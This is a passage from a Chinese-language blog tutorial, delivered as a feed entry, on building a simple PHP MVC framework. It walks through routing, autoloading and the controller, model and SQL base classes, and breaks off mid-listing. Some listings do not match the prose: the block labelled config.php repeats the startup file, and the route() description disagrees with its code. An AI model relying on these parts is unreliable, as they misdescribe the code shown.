    <link href="http://uknowsec.cn/posts/notes/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/PHP-MVC开发框架学习笔记.html</id>
    <published>2017-10-19T02:12:35.000Z</published>
    <updated>2017-10-19T09:01:59.227Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC模式（Model-View-Controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p>
<p>PHP中MVC模式也称Web MVC，从上世纪70年代进化而来。MVC的目的是实现一种动态的程序设计，便于后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。除此之外，此模式通过对复杂度的简化，使程序结构更加直观。软件系统通过对自身基本部份分离的同时，也赋予了各个基本部分应有的功能。</p>
<h3 id="MVC各部分的职能"><a href="#MVC各部分的职能" class="headerlink" title="MVC各部分的职能"></a>MVC各部分的职能</h3><p>MVC各部分的职能：</p>
<ul>
<li>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li>
<li>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</li>
<li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li>
</ul>
<h3 id="MVC流程"><a href="#MVC流程" class="headerlink" title="MVC流程"></a>MVC流程</h3><p>一个典型的Web MVC流程：</p>
<ul>
<li>Controller截获用户发出的请求；</li>
<li>Controller调用Model完成状态的读写操作；</li>
<li>Controller把数据传递给View；</li>
<li>View渲染最终结果并呈献给用户。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/web_mvc.gif" alt=""></p>
<h2 id="MVC框架开发"><a href="#MVC框架开发" class="headerlink" title="MVC框架开发"></a>MVC框架开发</h2><h3 id="目录准备"><a href="#目录准备" class="headerlink" title="目录准备"></a>目录准备</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/mvc1.png" alt=""></p>
<h3 id="目录的作用"><a href="#目录的作用" class="headerlink" title="目录的作用"></a>目录的作用</h3><ul>
<li>application – 应用代码</li>
<li>config – 程序配置或数据库配置</li>
<li>myphp - 框架核心目录</li>
<li>public – 静态文件</li>
<li>runtime - 临时数据目录</li>
</ul>
<h3 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h3><ul>
<li>MySQL的表名需小写，如：item，car</li>
<li>模块名（Models）需首字母大写，，并在名称后添加“Model”，如：ItemModel，CarModel</li>
<li>控制器（Controllers）需首字母大写，，并在名称中添加“Controller”，如：ItemController，CarController</li>
<li>视图（Views）部署结构为“控制器名/行为名”，如：item/view.php，car/buy.php</li>
</ul>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>将所有的数据请求都重定向 index.php 文件，在 myphp-frame 目录下新建一个 .htaccess 文件，文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line"></div><div class="line">    RewriteEngine On</div><div class="line"></div><div class="line">    # 确保请求路径不是一个文件名或目录</div><div class="line"></div><div class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</div><div class="line"></div><div class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</div><div class="line"></div><div class="line">    # 重定向所有请求到 index.php?url=PATHNAME</div><div class="line"></div><div class="line">    RewriteRule ^(.*)$ index.php?url=$1 [PT,L]</div><div class="line"></div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure>
<p>这样做的主要原因有：</p>
<ul>
<li>程序有一个单一的入口；</li>
<li>除静态程序，其他所有程序都重定向到 index.php 上；</li>
<li>可以用来生成利于SEO的URL，想要更好的配置URL，后期可能会需要URL路由，这里先不做介绍了。</li>
</ul>
<h4 id="htaccess创建方法"><a href="#htaccess创建方法" class="headerlink" title=".htaccess创建方法"></a>.htaccess创建方法</h4><p>按组合键windows+R 打开运行，然后输入命名CMD，然后在输入copy con .htaccess 回车 （不会看到变化），然后再按ctrl+Z键，再回车，然后就创建了</p>
<h3 id="入口文件"><a href="#入口文件" class="headerlink" title="入口文件"></a>入口文件</h3><p>在 myphp-frame目录下添加 index.php 文件，文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">// 应用目录为当前目录</div><div class="line">define(&apos;APP_PATH&apos;, __DIR__.&apos;/&apos;);</div><div class="line">// 开启调试模式</div><div class="line">define(&apos;APP_DEBUG&apos;, true);</div><div class="line">// 网站根URL</div><div class="line">define(&apos;APP_URL&apos;, &apos;http://localhost/myphp&apos;);</div><div class="line">// 加载框架</div><div class="line">require &apos;./myphp/MyPHP.php&apos;;</div></pre></td></tr></table></figure>
<p>注意，上面的PHP代码中，并没有添加PHP结束符号”?&gt;”，这么做的主要原因是，对于只有 PHP 代码的文件，结束标志(“?&gt;”)最好不存在，PHP自身并不需要结束符号，不添加结束符号可以很大程度上防止末尾被添加额外的注入内容，让程序更加安全。</p>
<h3 id="配置文件和主请求"><a href="#配置文件和主请求" class="headerlink" title="配置文件和主请求"></a>配置文件和主请求</h3><p>在 index.php 中，我们对 myphp  文件夹下的 MyPHP.php 发起了请求，那么 MyPHP.php 这个启动文件中到底会包含哪些内容呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 应用目录为当前目录</div><div class="line">define(&apos;APP_PATH&apos;, __DIR__ . &apos;/&apos;);</div><div class="line"></div><div class="line">// 开启调试模式</div><div class="line">define(&apos;APP_DEBUG&apos;, true);</div><div class="line"></div><div class="line">// 加载框架文件</div><div class="line">require(APP_PATH . &apos;myphp/Myphp.php&apos;);</div><div class="line"></div><div class="line">// 加载配置文件</div><div class="line">$config = require(APP_PATH . &apos;config/config.php&apos;);</div><div class="line"></div><div class="line">// 实例化框架类</div><div class="line">(new Myphp($config))-&gt;run();</div></pre></td></tr></table></figure>
<p>以上文件都其实可以直接在 index.php 文件中包含，常量也可以直接在 index.php 中定义，我们这么做的原因是为了在后期管理和拓展中更加的方便，所以把需要在一开始的时候就加载运行的程序统一放到一个单独的文件中引用。</p>
<p>先来看看config文件下的 config .php 文件，该文件的主要作用是设置一些程序的配置项及数据库连接等，主要内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">// 应用目录为当前目录</div><div class="line">define(&apos;APP_PATH&apos;, __DIR__ . &apos;/&apos;);</div><div class="line"></div><div class="line">// 开启调试模式</div><div class="line">define(&apos;APP_DEBUG&apos;, true);</div><div class="line"></div><div class="line">// 加载框架文件</div><div class="line">require(APP_PATH . &apos;myphp/Myphp.php&apos;);</div><div class="line"></div><div class="line">// 加载配置文件</div><div class="line">$config = require(APP_PATH . &apos;config/config.php&apos;);</div><div class="line"></div><div class="line">// 实例化框架类</div><div class="line">(new Myphp($config))-&gt;run();</div></pre></td></tr></table></figure>
<p>应该说 config.php 涉及到的内容并不多，不过是一些基础数据库的设置，再来看看 myphp下的共用框架入口文件 MyPHP.php 应该怎么写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/**</div><div class="line"> * myphp框架核心</div><div class="line"> */</div><div class="line">class Myphp</div><div class="line">&#123;</div><div class="line">    protected $config = [];</div><div class="line"></div><div class="line">    public function __construct($config)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;config = $config;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 运行程序</div><div class="line">    public function run()</div><div class="line">    &#123;</div><div class="line">        spl_autoload_register(array($this, &apos;loadClass&apos;));</div><div class="line">        $this-&gt;setReporting();</div><div class="line">        $this-&gt;removeMagicQuotes();</div><div class="line">        $this-&gt;unregisterGlobals();</div><div class="line">        $this-&gt;setDbConfig();</div><div class="line">        $this-&gt;route();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 路由处理</div><div class="line">    public function route()</div><div class="line">    &#123;</div><div class="line">        $controllerName = $this-&gt;config[&apos;defaultController&apos;];</div><div class="line">        $actionName = $this-&gt;config[&apos;defaultAction&apos;];</div><div class="line">        $param = array();</div><div class="line"></div><div class="line">        $url = $_SERVER[&apos;REQUEST_URI&apos;];</div><div class="line">        // 清除?之后的内容</div><div class="line">        $position = strpos($url, &apos;?&apos;);</div><div class="line">        $url = $position === false ? $url : substr($url, 0, $position);</div><div class="line">        // 删除前后的“/”</div><div class="line">        $url = trim($url, &apos;/&apos;);</div><div class="line"></div><div class="line">        if ($url) &#123;</div><div class="line">            // 使用“/”分割字符串，并保存在数组中</div><div class="line">            $urlArray = explode(&apos;/&apos;, $url);</div><div class="line">            // 删除空的数组元素</div><div class="line">            $urlArray = array_filter($urlArray);</div><div class="line">            </div><div class="line">            // 获取控制器名</div><div class="line">            $controllerName = ucfirst($urlArray[0]);</div><div class="line">            </div><div class="line">            // 获取动作名</div><div class="line">            array_shift($urlArray);</div><div class="line">            $actionName = $urlArray ? $urlArray[0] : $actionName;</div><div class="line">            </div><div class="line">            // 获取URL参数</div><div class="line">            array_shift($urlArray);</div><div class="line">            $param = $urlArray ? $urlArray : array();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 判断控制器和操作是否存在</div><div class="line">        $controller = $controllerName . &apos;Controller&apos;;</div><div class="line">        if (!class_exists($controller)) &#123;</div><div class="line">            exit($controller . &apos;控制器不存在&apos;);</div><div class="line">        &#125;</div><div class="line">        if (!method_exists($controller, $actionName)) &#123;</div><div class="line">            exit($actionName . &apos;方法不存在&apos;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 如果控制器和操作名存在，则实例化控制器，因为控制器对象里面</div><div class="line">        // 还会用到控制器名和操作名，所以实例化的时候把他们俩的名称也</div><div class="line">        // 传进去。结合Controller基类一起看</div><div class="line">        $dispatch = new $controller($controllerName, $actionName);</div><div class="line"></div><div class="line">        // $dispatch保存控制器实例化后的对象，我们就可以调用它的方法，</div><div class="line">        // 也可以像方法中传入参数，以下等同于：$dispatch-&gt;$actionName($param)</div><div class="line">        call_user_func_array(array($dispatch, $actionName), $param);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 检测开发环境</div><div class="line">    public function setReporting()</div><div class="line">    &#123;</div><div class="line">        if (APP_DEBUG === true) &#123;</div><div class="line">            error_reporting(E_ALL);</div><div class="line">            ini_set(&apos;display_errors&apos;,&apos;On&apos;);</div><div class="line">        &#125; else &#123;</div><div class="line">            error_reporting(E_ALL);</div><div class="line">            ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</div><div class="line">            ini_set(&apos;log_errors&apos;, &apos;On&apos;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 删除敏感字符</div><div class="line">    public function stripSlashesDeep($value)</div><div class="line">    &#123;</div><div class="line">        $value = is_array($value) ? array_map(array($this, &apos;stripSlashesDeep&apos;), $value) : stripslashes($value);</div><div class="line">        return $value;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 检测敏感字符并删除</div><div class="line">    public function removeMagicQuotes()</div><div class="line">    &#123;</div><div class="line">        if (get_magic_quotes_gpc()) &#123;</div><div class="line">            $_GET = isset($_GET) ? $this-&gt;stripSlashesDeep($_GET ) : &apos;&apos;;</div><div class="line">            $_POST = isset($_POST) ? $this-&gt;stripSlashesDeep($_POST ) : &apos;&apos;;</div><div class="line">            $_COOKIE = isset($_COOKIE) ? $this-&gt;stripSlashesDeep($_COOKIE) : &apos;&apos;;</div><div class="line">            $_SESSION = isset($_SESSION) ? $this-&gt;stripSlashesDeep($_SESSION) : &apos;&apos;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 检测自定义全局变量并移除。因为 register_globals 已经弃用，如果</div><div class="line">    // 已经弃用的 register_globals 指令被设置为 on，那么局部变量也将</div><div class="line">    // 在脚本的全局作用域中可用。 例如， $_POST[&apos;foo&apos;] 也将以 $foo 的</div><div class="line">    // 形式存在，这样写是不好的实现，会影响代码中的其他变量。 相关信息，</div><div class="line">    // 参考: http://php.net/manual/zh/faq.using.php#faq.register-globals</div><div class="line">    public function unregisterGlobals()</div><div class="line">    &#123;</div><div class="line">        if (ini_get(&apos;register_globals&apos;)) &#123;</div><div class="line">            $array = array(&apos;_SESSION&apos;, &apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;, &apos;_REQUEST&apos;, &apos;_SERVER&apos;, &apos;_ENV&apos;, &apos;_FILES&apos;);</div><div class="line">            foreach ($array as $value) &#123;</div><div class="line">                foreach ($GLOBALS[$value] as $key =&gt; $var) &#123;</div><div class="line">                    if ($var === $GLOBALS[$key]) &#123;</div><div class="line">                        unset($GLOBALS[$key]);</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 配置数据库信息</div><div class="line">    public function setDbConfig()</div><div class="line">    &#123;</div><div class="line">        if ($this-&gt;config[&apos;db&apos;]) &#123;</div><div class="line">            define(&apos;DB_HOST&apos;, $this-&gt;config[&apos;db&apos;][&apos;host&apos;]);</div><div class="line">            define(&apos;DB_NAME&apos;, $this-&gt;config[&apos;db&apos;][&apos;dbname&apos;]);</div><div class="line">            define(&apos;DB_USER&apos;, $this-&gt;config[&apos;db&apos;][&apos;username&apos;]);</div><div class="line">            define(&apos;DB_PASS&apos;, $this-&gt;config[&apos;db&apos;][&apos;password&apos;]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 自动加载控制器和模型类 </div><div class="line">    public static function loadClass($class)</div><div class="line">    &#123;</div><div class="line">        $frameworks = __DIR__ . &apos;/&apos; . $class . &apos;.php&apos;;</div><div class="line">        $controllers = APP_PATH . &apos;application/controllers/&apos; . $class . &apos;.php&apos;;</div><div class="line">        $models = APP_PATH . &apos;application/models/&apos; . $class . &apos;.php&apos;;</div><div class="line"></div><div class="line">        if (file_exists($frameworks)) &#123;</div><div class="line">            // 加载框架核心类</div><div class="line">            include $frameworks;</div><div class="line">        &#125; elseif (file_exists($controllers)) &#123;</div><div class="line">            // 加载应用控制器类</div><div class="line">            include $controllers;</div><div class="line">        &#125; elseif (file_exists($models)) &#123;</div><div class="line">            //加载应用模型类</div><div class="line">            include $models;</div><div class="line">        &#125; else &#123;</div><div class="line">            // 错误代码</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主请求方法 route()，首先我们想看看我们的 URL 会这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yoursite.com/controllerName/actionName/queryString</div></pre></td></tr></table></figure>
<p>route()的作用就是，从全局变量 \$_GET[‘url’]变量中获取 URL，并将其分割成三部分：\$controller、\$action 和 $queryString。</p>
<p>例如，URL链接为：myphp.com/item/view/1/first-item，那么</p>
<ul>
<li>$controller 就是：item</li>
<li>$action 就是：view</li>
<li>查询字符串Query String就是：array(1, first-item)</li>
</ul>
<p>分割完成后，会实例化一个新的控制器：$controller.’Controller’（其中“.”是连字符），并调用其方法 $action。</p>
<h3 id="控制器-Controller基类"><a href="#控制器-Controller基类" class="headerlink" title="控制器/Controller基类"></a>控制器/Controller基类</h3><p>接下来的操作就是在 myphp 中建立程序所需的基类，包括控制器、模型和视图的基类。</p>
<p>新建控制器基类为 Controller.php，控制器的主要功能就是总调度，具体具体内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">/**</div><div class="line"> * 控制器基类</div><div class="line"> */</div><div class="line">class Controller</div><div class="line">&#123;</div><div class="line">    protected $_controller;</div><div class="line">    protected $_action;</div><div class="line">    protected $_view;</div><div class="line"> </div><div class="line">    // 构造函数，初始化属性，并实例化对应模型</div><div class="line">    public function __construct($controller, $action)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_controller = $controller;</div><div class="line">        $this-&gt;_action = $action;</div><div class="line">        $this-&gt;_view = new View($controller, $action);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 分配变量</div><div class="line">    public function assign($name, $value)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_view-&gt;assign($name, $value);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 渲染视图</div><div class="line">    public function render()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_view-&gt;render();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Controller 类实现所有控制器、模型和视图（View类）的通信。在执行析构函数时，我们可以调用 render() 来显示视图（view）文件。</p>
<h3 id="模型Model基类"><a href="#模型Model基类" class="headerlink" title="模型Model基类"></a>模型Model基类</h3><p>新建模型基类为 Model.php，模型基类 Model.php 代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">class Model extends Sql</div><div class="line">&#123;</div><div class="line">    protected $model;</div><div class="line"></div><div class="line">    public function __construct()</div><div class="line">    &#123;</div><div class="line">        // 获取数据库表名</div><div class="line">        if (!$this-&gt;table) &#123;</div><div class="line"></div><div class="line">            // 获取模型类名称</div><div class="line">            $this-&gt;model = get_class($this);</div><div class="line"></div><div class="line">            // 删除类名最后的 Model 字符</div><div class="line">            $this-&gt;model = substr($this-&gt;model, 0, -5);</div><div class="line"></div><div class="line">            // 数据库表名与类名一致</div><div class="line">            $this-&gt;table = strtolower($this-&gt;model);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>考虑到模型需要对数据库进行处理，所以单独建立一个数据库基类 Sql.class.php，模型基类继承 Sql.php，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">class Sql</div><div class="line">&#123;</div><div class="line">    // 数据库表名</div><div class="line">    protected $table;</div><div class="line"></div><div class="line">    // 数据库主键</div><div class="line">    protected $primary = &apos;id&apos;;</div><div class="line"></div><div class="line">    // WHERE和ORDER拼装后的条件</div><div class="line">    private $filter = &apos;&apos;;</div><div class="line"></div><div class="line">    // Pdo bindParam()绑定的参数集合</div><div class="line">    private $param = array();</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 查询条件拼接，使用方式：</div><div class="line">     *</div><div class="line">     * $this-&gt;where([&apos;id = 1&apos;,&apos;and title=&quot;Web&quot;&apos;, ...])-&gt;fetch();</div><div class="line">     * 为防止注入，建议通过$param方式传入参数：</div><div class="line">     * $this-&gt;where([&apos;id = :id&apos;], [&apos;:id&apos; =&gt; $id])-&gt;fetch();</div><div class="line">     *</div><div class="line">     * @param array $where 条件</div><div class="line">     * @return $this 当前对象</div><div class="line">     */</div><div class="line">    public function where($where = array(), $param = array())</div><div class="line">    &#123;</div><div class="line">        if ($where) &#123;</div><div class="line">            $this-&gt;filter .= &apos; WHERE &apos;;</div><div class="line">            $this-&gt;filter .= implode(&apos; &apos;, $where);</div><div class="line"></div><div class="line">            $this-&gt;param = $param;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return $this;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 拼装排序条件，使用方式：</div><div class="line">     *</div><div class="line">     * $this-&gt;order([&apos;id DESC&apos;, &apos;title ASC&apos;, ...])-&gt;fetch();</div><div class="line">     *</div><div class="line">     * @param array $order 排序条件</div><div class="line">     * @return $this</div><div class="line">     */</div><div class="line">    public function order($order = array())</div><div class="line">    &#123;</div><div class="line">        if($order) &#123;</div><div class="line">            $this-&gt;filter .= &apos; ORDER BY &apos;;</div><div class="line">            $this-&gt;filter .= implode(&apos;,&apos;, $order);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return $this;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 查询所有</div><div class="line">    public function fetchAll()</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;select * from `%s` %s&quot;, $this-&gt;table, $this-&gt;filter);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;fetchAll();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 查询一条</div><div class="line">    public function fetch()</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;select * from `%s` %s&quot;, $this-&gt;table, $this-&gt;filter);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;fetch();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 根据条件 (id) 删除</div><div class="line">    public function delete($id)</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;delete from `%s` where `%s` = :%s&quot;, $this-&gt;table, $this-&gt;primary, $this-&gt;primary);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, [$this-&gt;primary =&gt; $id]);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;rowCount();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 新增数据</div><div class="line">    public function add($data)</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;insert into `%s` %s&quot;, $this-&gt;table, $this-&gt;formatInsert($data));</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $data);</div><div class="line">        $sth = 